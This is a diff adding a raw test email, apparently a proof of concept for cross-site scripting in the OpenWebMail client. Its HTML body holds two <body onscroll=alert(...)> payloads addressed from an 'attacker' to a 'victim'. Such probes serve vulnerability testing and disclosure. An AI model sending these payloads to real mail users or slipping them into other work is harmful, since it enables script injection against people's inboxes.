@@ -1,0 +1,8 @@
+From: <attacker@attacker.com>
+Subject: test three
+To: victim@openwebmail.com
+MIME-Version: 1.0
+Content-type: text/html
+
+xxxxxxxxxxxxxxxxxxxx<body onscroll=alert(/xss1/)>
+<body onscroll=alert(/xss2/)>
